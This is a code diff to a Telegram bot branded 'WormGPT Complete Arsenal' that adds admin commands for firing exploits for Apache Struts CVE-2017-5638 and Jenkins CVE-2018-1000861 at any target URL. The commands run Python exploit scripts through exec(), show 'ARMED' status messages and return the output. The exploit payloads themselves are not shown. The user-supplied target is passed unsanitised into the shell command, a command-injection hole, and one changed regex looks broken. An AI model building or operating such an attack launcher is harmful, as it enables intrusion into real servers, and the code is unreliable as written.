@@ -101,6 +101,8 @@ export class WHOAMISecAITelegramBot {
 💀 **WormGPT Complete Arsenal** 💀
 
 **Available Exploits:**
+• /cve_2017_5638 <target> - Apache Struts RCE (Equifax)
+• /cve_2018_1000861 <target> - Jenkins SSRF
 • /cve_2025_29824 <target> - CLFS Driver EoP (Windows)
 • /cve_2025_5777 <target> - CitrixBleed 2 (NetScaler)
 • /cve_2026_2441 <target> - Chrome CSS RCE
@@ -157,7 +159,7 @@ export class WHOAMISecAITelegramBot {
     });
 
     // CVE-2026-2441 - Chrome CSS RCE
-    this.bot.onText(/\/cve_2026_2441 (.+)/, (msg, match) => {
+    this.bot.onText(/\\/cve_2026_2441 (.+)/, (msg, match) => {
       if (!this.isAdmin(msg.chat.id.toString())) return;
       const target = match?.[1];
       if (!target) {
@@ -170,6 +172,57 @@ export class WHOAMISecAITelegramBot {
       try {
         const result = wormGPTArsenal.cve_2026_2441_chrome_rce(target);
         this.bot.sendMessage(msg.chat.id, `✅ **Exploit Ready**\n\n${JSON.stringify(result, null, 2).substring(0, 500)}...`, { parse_mode: 'Markdown' });
+      } catch (error) {
+        this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
+      }
+    });
+
+    // CVE-2017-5638 - Apache Struts RCE
+    this.bot.onText(/\\/cve_2017_5638 (.+)/, (msg, match) => {
+      if (!this.isAdmin(msg.chat.id.toString())) return;
+      const target = match?.[1];
+      if (!target) {
+        this.bot.sendMessage(msg.chat.id, 'Usage: /cve_2017_5638 <target_url>');
+        return;
+      }
+      
+      this.bot.sendMessage(msg.chat.id, `💀 **CVE-2017-5638** - Apache Struts RCE (Equifax)\n\n🎯 Target: ${target}\n⚡ Status: ARMED\n\nFiring OGNL payload...`, { parse_mode: 'Markdown' });
+      
+      try {
+        // Call Python exploit via child_process
+        const { exec } = require('child_process');
+        exec(`python3 ${__dirname}/manus-core/exploits/cve-2017-5638.py -u ${target} -c whoami`, (error, stdout, stderr) => {
+          if (error) {
+            this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
+            return;
+          }
+          this.bot.sendMessage(msg.chat.id, `✅ **Exploit Fired**\n\n${stdout.substring(0, 500)}`, { parse_mode: 'Markdown' });
+        });
+      } catch (error) {
+        this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
+      }
+    });
+
+    // CVE-2018-1000861 - Jenkins SSRF
+    this.bot.onText(/\\/cve_2018_1000861 (.+)/, (msg, match) => {
+      if (!this.isAdmin(msg.chat.id.toString())) return;
+      const target = match?.[1];
+      if (!target) {
+        this.bot.sendMessage(msg.chat.id, 'Usage: /cve_2018_1000861 <target_url>');
+        return;
+      }
+      
+      this.bot.sendMessage(msg.chat.id, `💀 **CVE-2018-1000861** - Jenkins SSRF\n\n🎯 Target: ${target}\n⚡ Status: ARMED\n\nTriggering SSRF...`, { parse_mode: 'Markdown' });
+      
+      try {
+        const { exec } = require('child_process');
+        exec(`python3 ${__dirname}/manus-core/exploits/cve-2018-1000861.py -u ${target}`, (error, stdout, stderr) => {
+          if (error) {
+            this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
+            return;
+          }
+          this.bot.sendMessage(msg.chat.id, `✅ **SSRF Triggered**\n\n${stdout.substring(0, 500)}`, { parse_mode: 'Markdown' });
+        });
       } catch (error) {
         this.bot.sendMessage(msg.chat.id, `❌ Exploit error: ${error}`);
       }
